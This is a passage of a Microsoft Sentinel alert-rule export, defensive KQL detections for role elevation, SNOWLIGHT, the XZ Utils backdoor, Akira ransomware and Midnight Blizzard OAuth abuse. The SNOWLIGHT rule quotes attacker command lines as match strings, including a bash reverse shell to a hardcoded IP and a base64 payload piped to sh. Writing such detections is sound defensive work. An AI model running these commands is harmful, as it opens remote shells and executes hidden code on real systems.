recentList\n| join kind = leftanti lookbackList on ElevatedRole, TargetUserPrincipalName\n;\nnewlyElevated | project Id, AdditionalDetails\n| mv-expand bagexpansion=array AdditionalDetails\n| evaluate bag_unpack(AdditionalDetails)\n| extend key = column_ifexists(\"key\", ''), value = column_ifexists(\"value\", '')\n| evaluate pivot(key, make_set(value))\n| extend ipaddr = todynamic(column_ifexists(\"ipaddr\", \"\"))\n| mv-expand ipaddr\n| project Id, InitiatingIPAddress = tostring(ipaddr)\n| join kind=rightouter newlyElevated on Id\n| extend InitiatingAppName = tostring(InitiatedBy.app.displayName)\n| extend InitiatingAppServicePrincipalId = tostring(InitiatedBy.app.servicePrincipalId)\n| extend InitiatingUserPrincipalName = tostring(InitiatedBy.user.userPrincipalName)\n| extend InitiatingAadUserId = tostring(InitiatedBy.user.id)\n| extend InitiatingIPAddress = iff(isnotempty(tostring(InitiatedBy.user.ipAddress)), tostring(InitiatedBy.user.ipAddress), InitiatingIPAddress)\n| extend ElevatedBy = iff(isnotempty(InitiatingUserPrincipalName), InitiatingUserPrincipalName, InitiatingAppName)\n| extend ElevatedUser = TargetUserPrincipalName\n| extend InitiatingAccountName = tostring(split(InitiatingUserPrincipalName, \"@\")[0]), InitiatingAccountUPNSuffix = tostring(split(InitiatingUserPrincipalName, \"@\")[1])\n| extend TargetAccountName = tostring(split(TargetUserPrincipalName, \"@\")[0]), TargetAccountUPNSuffix = tostring(split(TargetUserPrincipalName, \"@\")[1])\n| project-reorder ElevatedUser, ElevatedRole, ResultReason, ElevatedBy, InitiatingUserPrincipalName, InitiatingAadUserId, InitiatingIPAddress, TargetUserPrincipalName\n","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"InitiatingUserPrincipalName"},{"identifier":"Name","columnName":"InitiatingAccountName"},{"identifier":"UPNSuffix","columnName":"InitiatingAccountUPNSuffix"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"InitiatingAadUserId"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"TargetUserPrincipalName"},{"identifier":"Name","columnName":"TargetAccountName"},{"identifier":"UPNSuffix","columnName":"TargetAccountUPNSuffix"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"InitiatingIPAddress"}]}],"templateVersion":"1.1.2","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence"],"techniques":["T1078"],"displayName":"Account Elevated to New Role","enabled":true,"description":"Detects an account that is elevated to a new role where that account has not had that role in the last 14 days.\n  Role elevations are a key mechanism for gaining permissions, monitoring which users have which roles, and for anomalies in those roles is useful for finding suspicious activity.\n  Ref: https://docs.microsoft.com/azure/active-directory/fundamentals/security-operations-privileged-accounts#changes-to-privileged-accounts","alertRuleTemplateName":"c1c66f0b-5531-4a3e-a619-9d2f770ef730","lastModifiedUtc":"2024-05-22T12:19:31.0535094Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/9214c15c-c700-4359-b1ed-8543547a2843","name":"9214c15c-c700-4359-b1ed-8543547a2843","etag":"\"87008eac-0000-2700-0000-66fdc6e70000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"// BAH_SNOWLIGHT\n// Author: Shawn McWhirter\n// Description: SNOWLIGHT uses raw sockets to connect to a hardcoded IP address over TCP port 443 and uses a binary protocol to communicate with the command and control server.\n// https://www.mandiant.com/resources/blog/initial-access-brokers-exploit-f5-screenconnect\n// False Positives: N/A\nlet ActionTypes = dynamic([\"FileCreated\", \"FileModified\"]);\nlet FileNames = dynamic([\"LG\", \"memfd:a\", \"undefined\"]);\nlet MD5s = dynamic([\"c867881c56698f938b4e8edafe76a09b\",\n                    \"df4603548b10211f0aa77d0e9a172438\",\n                    \"0951109dd1be0d84a33d52c135ba9c97\",\n                    \"9c3bf506dd19c08c0ed3af9c1708a770\",\n                    \"0ba435460fb7622344eec28063274b8a\",\n                    \"a78bf3d16349eba86719539ee8ef562d\"]);\nlet Cmds = dynamic([\"cmd_data=run util bash -c \\\"echo dG1zaCAtcSAtYyAnY2QgLztzaG93IHJ1bm5pbmctY29uZmlnIHJlY3Vyc2l2ZSc= | base64 -d | sh\\\"  \\\"tmsh -q -c \\'cd /;show running-config recursive\\'\\\"\",\n                    'run util bash -c \"bash -i /dev/tcp/172.104.124.74/443 0>&1 &\"']);\nlet signInLookup = (\n    SigninLogs\n    | where TimeGenerated >= ago(1d)\n    | where DeviceDetail contains \"displayName\"\n    | extend DeviceDetailJson = parse_json(DeviceDetail)\n    | extend DeviceNameSI = tostring(DeviceDetailJson.displayName)\n    | distinct DeviceNameSI, UserPrincipalName, UserDisplayName\n);\n(union isfuzzy=True\n  (\n  DeviceProcessEvents\n  | where InitiatingProcessCommandLine has_any (Cmds)\n  | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n  | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n  | project TimeGenerated, DeviceName, UserPrincipalName, FileName, FolderPath, MD5, InitiatingProcessCommandLine, Tactic = \"Possible SNOWLIGHT command usage\"\n  ),(\n  DeviceFileEvents\n  | where ActionType in (ActionTypes) and FileName in (FileNames) and MD5 in (MD5s)\n  | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n  | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n  | project TimeGenerated, DeviceName, UserPrincipalName, RequestAccountName, FileName, FolderPath, MD5, InitiatingProcessCommandLine, Tactic = \"Possible SNOWLIGHT files\"\n  )\n)\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"entityMappings":[{"entityType":"Process","fieldMappings":[{"identifier":"CommandLine","columnName":"InitiatingProcessCommandLine"}]},{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DeviceName"}]},{"entityType":"File","fieldMappings":[{"identifier":"Name","columnName":"FolderPath"},{"identifier":"Directory","columnName":"FileName"}]},{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"UserPrincipalName"}]},{"entityType":"FileHash","fieldMappings":[{"identifier":"Value","columnName":"MD5"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Execution","CommandAndControl"],"techniques":["T1059","T1572"],"displayName":"BAH_SNOWLIGHT","enabled":true,"description":"SNOWLIGHT uses raw sockets to connect to a hardcoded IP address over TCP port 443 and uses a binary protocol to communicate with the command and control server.\nPLATFORM:Microsoft 365,Azure AD,Windows,IaaS\nMITRE:TA0002;T1059,TA0011;T1572","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:19:18.8962113Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/42b7512e-8957-437f-bef9-4878c319b5f8","name":"42b7512e-8957-437f-bef9-4878c319b5f8","etag":"\"87007e73-0000-2700-0000-66fdc3800000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"// BAH_XZUtils_IOCs\r\n  // Author: Shawn McWhirter\r\n  // Description:A reported supply chain compromise found in the XZ Utils library (formerly known as LZMA Utils). The malicious code, which was introduced by a previously trusted developer, attempts to weaken the authentication of SSH sessions via SSHD. The affected versions of XZ are not widely distributed and are typically found in the most bleeding-edge Linux distribution builds such as the fedora rawhide and debian testing and unstable distributions.\r\n  // \"https://www.crowdstrike.com/blog/cve-2024-3094-xz-upstream-supply-chain-attack/\", \"https://www.openwall.com/lists/oss-security/2024/03/29/4\", \"https://security.apps.mil/homepage?tid=102d0191-eeae-4761-b1cb-1a83e86ef445\"\r\n  // False Positives: N/A\r\n  let ActionTypes = dynamic([\"FileCreated\", \"FileModified\"]);\r\n  let FileNames = dynamic([\"bad-3-corrupt_lzma2.xz\", \"bad-dict_size.lzma\", \"good-2cat.xz\", \"good-large_compressed.lzma\", \"good-small_compressed.lzma\", \"build-to-host.m4\"]);\r\n  let SHA256s = dynamic([\"319feb5a9cddd81955d915b5632b4a5f8f9080281fb46e2f6d69d53f693c23ae\",\r\n      \"605861f833fc181c7cdcabd5577ddb8989bea332648a8f498b4eef89b8f85ad4\",\r\n      \"8fa641c454c3e0f76de73b7cc3446096b9c8b9d33d406d38b8ac76090b0344fd\",\r\n      \"b418bfd34aa246b2e7b5cb5d263a640e5d080810f767370c4d2c24662a274963\",\r\n      \"cbeef92e67bf41ca9c015557d81f39adaba67ca9fb3574139754999030b83537\",\r\n      \"13bdc7473154593a0cf6456561cd543f1f341a7621f5863054c88ba49534e569\",\r\n      \"0c9a148be4dc52ae3c2b10c68b2ccbc5eda7b6a550128b4b7c0ea0a7efec1a89\",\r\n      \"f0121dc056607058f46fe60610ac472d8278f50729e5d7d2e5023bd04ea11fbd\",\r\n      \"616e38159153b8aa2a98193ae5325597b8732443421c81d0a57bd878b2c6d2a8\",\r\n      \"b334e3d936e7f59e3e1a526328ef4377718d394b44e7b9eb8ed1485ea48fde2f\",\r\n      \"5448850cdc3a7ae41ff53b433c2adbd0ff492515012412ee63a40d2685db3049\",\r\n      \"054003928e240de8b9f3232e1bb885a5b6cc09488742159a0e3d6080e16499f4\",\r\n      \"8c8bf0346d79993b99f69bac212df33a558d648bb2d13038ae7835e85fd8cb25\",\r\n      \"05fa6f90e75ae713aea5e514fc20709ee0d185a5006c37d044980943dd9227ab\",\r\n      \"237284fae40e5f8e9908f0a977e7d0b9a5c7c1c10a41b8e6ed0fb40e930467c8\",\r\n      \"876a17247dd0be61925b062008145b703e9fe30bbfae24c7127017e9c7df4130\",\r\n      \"88c8631cefba91664fdc47b14bb753e1876f4964a07db650821d203992b1e1ea\",\r\n      \"0f5c81f14171b74fcc9777d302304d964e63ffc2d7b634ef023a7249d9b5d875\",\r\n      \"cdafe1632f139c82937cc1ed824f7a60b7b0a0619dfbbd681dcac02b1ac28f5b\",\r\n      \"80c8afc89e842d739c0acc4eb30d4fe2963ce4b28915bee526092213328e92c6\",\r\n      \"d300422649a0124b1121630be559c890ceedf32667d7064b8128933166c217c8\",\r\n      \"2398f4a8e53345325f44bdd9f0cc7401bd9025d736c6d43b372f4dea77bf75b8\",\r\n      \"f334777310ca3ae9ba07206d78ed286a655aa3f44eec27854f740c26b2cd2ed0\",\r\n      \"2a3e54048752d5d31f85fbda912ab126f7101186c6f3e7a54dcee47cf751a63f\"]);\r\n  let Cmds = dynamic([\"\\\\114-\\\\321\\\\322-\\\\377\\\\35-\\\\47\\\\14-\\\\34\\\\0-\\\\13\\\\50-\\\\113 \\\\0-\\\\377\",\r\n      \"\\\\5-\\\\51\\\\204-\\\\377\\\\52-\\\\115\\\\132-\\\\203\\\\0-\\\\4\\\\116-\\\\131 \\\\0-\\\\377\"]);\r\n  let signInLookup = (\r\n      SigninLogs\r\n      | where TimeGenerated >= ago(1d)\r\n      | where DeviceDetail contains \"displayName\"\r\n      | extend DeviceDetailJson = parse_json(DeviceDetail)\r\n      | extend DeviceNameSI = tostring(DeviceDetailJson.displayName)\r\n      | distinct DeviceNameSI, UserPrincipalName, UserDisplayName\r\n      );\r\n  (union isfuzzy=True\r\n      (\r\n      DeviceProcessEvents\r\n      | where ProcessCommandLine has_any (Cmds)\r\n      | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\r\n      | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\r\n      | project\r\n          TimeGenerated,\r\n          DeviceName,\r\n          UserPrincipalName,\r\n          FileName,\r\n          FolderPath,\r\n          SHA256,\r\n          ProcessCommandLine,\r\n          Tactic = \"Malicious XZ Utilities command usage\"\r\n      ),\r\n      (\r\n      DeviceFileEvents\r\n      | where ActionType in (ActionTypes) and FileName in (FileNames) and SHA256 in (SHA256s)\r\n      | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\r\n      | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\r\n      | project\r\n          TimeGenerated,\r\n          DeviceName,\r\n          UserPrincipalName,\r\n          RequestAccountName,\r\n          FileName,\r\n          FolderPath,\r\n          SHA256,\r\n          InitiatingProcessCommandLine,\r\n          Tactic = \"Malicious XZ Utilities related files\")\r\n  )","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DeviceName"}]},{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"UserPrincipalName"}]},{"entityType":"File","fieldMappings":[{"identifier":"Name","columnName":"FileName"},{"identifier":"Directory","columnName":"FolderPath"}]},{"entityType":"FileHash","fieldMappings":[{"identifier":"Value","columnName":"SHA256"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["LateralMovement","Execution","InitialAccess","Discovery","CommandAndControl"],"techniques":["T1021","T1059","T1190","T1033","T1219"],"displayName":"BAH_XZUtils_IOCs","enabled":true,"description":"A reported supply chain compromise found in the XZ Utils library (formerly known as LZMA Utils). The malicious code, which was introduced by a previously trusted developer, attempts to weaken the authentication of SSH sessions via SSHD. The affected versions of XZ are not widely distributed and are typically found in the most bleeding-edge Linux distribution builds such as the fedora rawhide and debian testing and unstable distributions.\nPLATFORM:Microsoft 365,Azure AD,Windows,IaaS\nMITRE:TA0001;T1190,TA0002;T1059,TA0007;T1033,TA0008;T1021,TA0011;T1219","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:04:44.8536268Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/78421e71-7c95-4de4-bc0e-6c6d56878a1c","name":"78421e71-7c95-4de4-bc0e-6c6d56878a1c","etag":"\"900753c4-0000-2700-0000-6627ea430000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Low","query":"  let aadFunc = (tableName:string){\r\n  table(tableName)\r\n  | where AppId =~ \"1b730954-1685-4b74-9bfd-dac224a7b894\" // AppDisplayName IS Azure Active Directory PowerShell\r\n  | where TokenIssuerType =~ \"AzureAD\"\r\n  | where ResourceIdentity !in (\"00000002-0000-0000-c000-000000000000\", \"00000003-0000-0000-c000-000000000000\") // ResourceDisplayName IS NOT Windows Azure Active Directory OR Microsoft Graph\r\n  | extend Status = todynamic(Status)\r\n  | where Status.errorCode == 0 // Success\r\n  | project-reorder IPAddress, UserAgent, ResourceDisplayName, UserDisplayName, UserId, UserPrincipalName, Type\r\n  | order by TimeGenerated desc\r\n  | extend Name = tostring(split(UserPrincipalName,'@',0)[0]), UPNSuffix = tostring(split(UserPrincipalName,'@',1)[0])\r\n  };\r\n  let aadSignin = aadFunc(\"SigninLogs\");\r\n  let aadNonInt = aadFunc(\"AADNonInteractiveUserSignInLogs\");\r\n  union isfuzzy=true aadSignin, aadNonInt","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserPrincipalName"},{"identifier":"Name","columnName":"Name"},{"identifier":"UPNSuffix","columnName":"UPNSuffix"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPAddress"}]}],"alertDetailsOverride":{"alertDynamicProperties":[]},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess"],"techniques":["T1078"],"displayName":"DEOS_CTH_Microsoft Entra ID PowerShell accessing non-Entra ID resources","enabled":true,"description":"'This will alert when a user or application signs in using Microsoft Entra ID PowerShell to access non-Active Directory resources, such as the Azure Key Vault, which may be undesired or unauthorized behavior.\n  For capabilities and expected behavior of the Microsoft Entra ID PowerShell module, see: https://docs.microsoft.com/powershell/module/azuread/?view=azureadps-2.0.\n  For further information on Microsoft Entra ID Signin activity reports, see: https://docs.microsoft.com/azure/active-directory/reports-monitoring/concept-sign-ins.'","alertRuleTemplateName":null,"lastModifiedUtc":"2024-04-23T17:05:05.2836757Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/4f5bbd71-2aa9-4b1a-9952-a39547129938","name":"4f5bbd71-2aa9-4b1a-9952-a39547129938","etag":"\"87000dcd-0000-2700-0000-66fdc9250000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"// BAH_Midnight_Blizzard_full_access_as_app\n// Author: Shawn McWhirter\n// Description:This detection looks for the full_access_as_app permission being granted to an OAuth application with Admin Consent. This permission provide access to all Exchange mailboxes via the EWS API can could be exploited to access sensitive data by being added to a compromised application. The application granted this permission should be reviewed to ensure that it is absolutely necessary for the applications function.\n// \"https://learn.microsoft.com/en-us/graph/auth-limit-mailbox-access\", \"https://github.com/Azure/Azure-Sentinel/blob/master/Solutions/Microsoft%20Entra%20ID/Analytic%20Rules/ExchangeFullAccessGrantedToApp.yaml\"\n// False Positives: Applications that may be setup wrong or given too much permissions in the infrastructure. Apps that need to be tuned.\nAuditLogs\n  | where LoggedByService =~ \"Core Directory\"\n  | mv-expand TargetResources\n  | extend OAuthAppName = TargetResources.displayName\n  | extend ModifiedProperties = TargetResources.modifiedProperties\n  | mv-apply Property = ModifiedProperties on\n    (\n        where Property.displayName =~ \"ConsentContext.isAdminConsent\"\n        | extend AdminConsent = tostring(Property.newValue)\n    )\n  | mv-apply Property = ModifiedProperties on\n    (\n        where Property.displayName =~ \"ConsentAction.Permissions\"\n        | extend Permissions = tostring(Property.newValue)\n    )\n  | mv-apply Property = ModifiedProperties on\n    (\n        where Property.displayName =~ \"TargetId.ServicePrincipalNames\"\n        | extend AppId = tostring(Property.newValue)\n    )\n  | mv-apply Property = AdditionalDetails on\n    (\n        where Property.key =~ \"User-Agent\"\n        | extend InitiatingUserAgent = replace_string('\"', '', tostring(Property.value))\n    )\n  | project-away Property\n  | parse Permissions with * \"ConsentType: \" GrantConsentType \", Scope: \" GrantScope1 \",\" *\n  | extend InitiatingAppName = tostring(InitiatedBy.app.displayName)\n  | extend InitiatingAppServicePrincipalId = tostring(InitiatedBy.app.servicePrincipalId)\n  | extend InitiatingUserPrincipalName = tostring(InitiatedBy.user.userPrincipalName)\n  | extend InitiatingAadUserId = tostring(InitiatedBy.user.id)\n  | extend InitiatingIpAddress = tostring(iff(isnotempty(InitiatedBy.user.ipAddress), InitiatedBy.user.ipAddress, InitiatedBy.app.ipAddress))\n  | project-reorder TimeGenerated, OAuthAppName, AppId, AdminConsent, Permissions, InitiatingUserPrincipalName, InitiatingAadUserId, InitiatingAppName, InitiatingAppServicePrincipalId, InitiatingIpAddress, InitiatingUserAgent, GrantScope1, GrantConsentType\n  | extend GrantInitiatedBy = tostring(iff(isnotempty(InitiatingUserPrincipalName), InitiatingUserPrincipalName, InitiatingAppName))\n  | extend Name = split(InitiatingUserPrincipalName, \"@\")[0], UPNSuffix = split(InitiatingUserPrincipalName, \"@\")[1]","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"customDetails":{},"entityMappings":[{"entityType":"CloudApplication","fieldMappings":[{"identifier":"AppId","columnName":"AppId"},{"identifier":"Name","columnName":"OAuthAppName"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"InitiatingUserPrincipalName"},{"identifier":"Name","columnName":"Name"},{"identifier":"UPNSuffix","columnName":"UPNSuffix"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"InitiatingAadUserId"}]},{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"InitiatingAppServicePrincipalId"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"InitiatingIpAddress"}]}],"alertDetailsOverride":{"alertDynamicProperties":[]},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion"],"techniques":["T1550"],"displayName":"BAH_Midnight_Blizzard_full_access_as_app","enabled":true,"description":"This detection looks for the full_access_as_app permission being granted to an OAuth application with Admin Consent. This permission provide access to all Exchange mailboxes via the EWS API can could be exploited to access sensitive data by being added to a compromised application. The application granted this permission should be reviewed to ensure that it is absolutely necessary for the applications function.\nPLATFORM:Microsoft 365,Windows,IaaS\nMITRE:TA0005;T1550","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:28:45.3814329Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/fda6eac4-5171-48ce-9fa1-a0be364ecc7b","name":"fda6eac4-5171-48ce-9fa1-a0be364ecc7b","etag":"\"88002c0e-0000-2700-0000-66fdcd840000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"//Title: BAH_AkiraRansomware\n// Author: Steven Wan\n// Description: Akira ransomware threat actors deploy and focus on targeting Linux variant VMware ESXi virtual machines. Akira threat actors will launch their attacks using both Megazord (a Rust-based code) and Akira (written in C++).\n// Additional Details: [https://www.cisa.gov/news-events/alerts/2024/04/18/cisa-and-partners-release-advisory-akira-ransomware]\n// False Positives: N/A\n\nlet hashlist = dynamic(['d2fd0654710c27dcf37b6c1437880020824e161dd0bf28e3a133ed777242a0ca',\n'dcfa2800754e5722acf94987bb03e814edcb9acebda37df6da1987bf48e5b05e',\n'bc747e3bf7b6e02c09f3d18bdd0e64eef62b940b2f16c9c72e647eec85cf0138',\n'73170761d6776c0debacfbbc61b6988cb8270a20174bf5c049768a264bb8ffaf',\n'1b60097bf1ccb15a952e5bcc3522cf5c162da68c381a76abc2d5985659e4d386',\n'aaa647327ba5b855bedea8e889b3fafdc05a6ca75d1cfd98869432006d6fecc9',\n'7d6959bb7a9482e1caa83b16ee01103d982d47c70c72fdd03708e2b7f4c552c4',\n'3298d203c2acb68c474e5fdad8379181890b4403d6491c523c13730129be3f75',\n'0ee1d284ed663073872012c7bde7fac5ca1121403f1a5d2d5411317df282796c',\n'ffd9f58e5fe8502249c67cad0123ceeeaa6e9f69b4ec9f9e21511809849eb8fc',\n'dfe6fddc67bdc93b9947430b966da2877fda094edf3e21e6f0ba98a84bc53198',\n'131da83b521f610819141d5c740313ce46578374abb22ef504a7593955a65f07',\n'9f393516edf6b8e011df6ee991758480c5b99a0efbfd68347786061f0e04426c',\n'9585af44c3ff8fd921c713680b0c2b3bbc9d56add848ed62164f7c9b9f23d065',\n'2f629395fdfa11e713ea8bf11d40f6f240acf2f5fcf9a2ac50b6f7fbc7521c83',\n'7f731cc11f8e4d249142e99a44b9da7a48505ce32c4ee4881041beeddb3760be',\n'95477703e789e6182096a09bc98853e0a70b680a4f19fa2bf86cbb9280e8ec5a',\n'0c0e0f9b09b80d87ebc88e2870907b6cacb4cd7703584baf8f2be1fd9438696d',\n'C9c94ac5e1991a7db42c7973e328fceeb6f163d9f644031bdfd4123c7b3898b0',\n'aaa6041912a6ba3cf167ecdb90a434a62feaf08639c59705847706b9f492015d',\n'18051333e658c4816ff3576a2e9d97fe2a1196ac0ea5ed9ba386c46defafdb88',\n'5e1e3bf6999126ae4aa52146280fdb913912632e8bac4f54e98c58821a307d32',\n'8317ff6416af8ab6eb35df3529689671a700fdb61a5e6436f4d6ea8ee002d694',\n'892405573aa34dfc49b37e4c35b655543e88ec1c5e8ffb27ab8d1bbf90fc6ae0'\n]);\nlet signInLookup = (\nSigninLogs\n| where TimeGenerated >= ago(1d)\n| where DeviceDetail contains \"displayName\"\n| extend DeviceDetailJson = parse_json(DeviceDetail)\n| extend DeviceNameSI = tostring(DeviceDetailJson.displayName)\n| distinct DeviceNameSI, UserPrincipalName\n);\n(union isfuzzy=True\n    (\n    union withsource=TableName Device* //looks at any table titled \"Device\"\n    | where SHA256 has_any (hashlist)  //checks for any SHA256 in the hashlist\n    | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n    )\n| project TimeGenerated, AccountName, UserPrincipalName, FileName, FileOriginIP, SHA256, MD5, DeviceName\n)","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"entityMappings":[{"entityType":"FileHash","fieldMappings":[{"identifier":"Value","columnName":"SHA256"}]},{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"UserPrincipalName"}]},{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"DeviceName"}]},{"entityType":"File","fieldMappings":[{"identifier":"Name","columnName":"FileName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess","Persistence","DefenseEvasion","Exfiltration"],"techniques":["T1190","T1133","T1566","T1078","T1136"],"displayName":"BAH_AkiraRansomware","enabled":true,"description":"Akira ransomware threat actors deploy and focus on targeting Linux variant VMware ESXi virtual machines. Akira threat actors will launch their attacks using both Megazord (a Rust-based code) and Akira (written in C++).\nPLATFORM:IaaS,Microsoft 365,Linux,Azure AD\nMITRE:TA0001;T1078;T1133;T1190;T1566,TA0003;T1078;T1133;T1136,TA0005;T1078","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:47:31.6296728Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/d70a36db-10d8-4f29-88f8-fcd1c3447733","name":"d70a36db-10d8-4f29-88f8-fcd1c3447733","etag":"\"04005848-0000-2700-0000-6658e4090000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"MicrosoftSecurityIncidentCreation","properties":{"productFilter":"Microsoft 365 Insider Risk Management","severitiesFilter":null,"displayNamesFilter":null,"displayNamesExcludeFilter":null,"displayName":"(Private Preview) Create incidents based on Microsoft 365 Insider Risk Management","enabled":true,"description":"Create incidents based on all alerts generated in Microsoft 365 Insider Risk Management\n","alertRuleTemplateName":"c805d9b1-97e7-4bc0-9172-67edb36273e4","lastModifiedUtc":"2024-05-30T20:39:37.4028836Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/7e7bb6bf-6d73-47c9-bf30-3266c04ea8fa","name":"7e7bb6bf-6d73-47c9-bf30-3266c04ea8fa","etag":"\"9601825c-0000-2700-0000-666affc50000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//BAH_Midnight_Blizzard_OAuth_Apps_Reading_Mail\n//Author: Shawn McWhirter\n//Description:Nobelium may re-purpose legitimate existing OAuth Applications in the environment to their own ends. However, malicious activity patterns may be discernable from  legitimate ones. The following query returns OAuth Applications that access mail both directly and via Graph, allowing review of whether such dual access methods follow expected use patterns.\n//\"https://www.microsoft.com/en-us/security/blog/2024/01/25/midnight-blizzard-guidance-for-responders-on-nation-state-attack/\", \"https://github.com/Azure/Azure-Sentinel/blob/master/Hunting%20Queries/Microsoft%20365%20Defender/Exfiltration/OAuth%20Apps%20reading%20mail%20both%20via%20GraphAPI%20and%20directly%20%5BNobelium%5D.yaml\", \"https://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/\"\n//False Positives: Legitimate OAuth applications, possible misconfigurations.\nlet oAuthAppIdList = 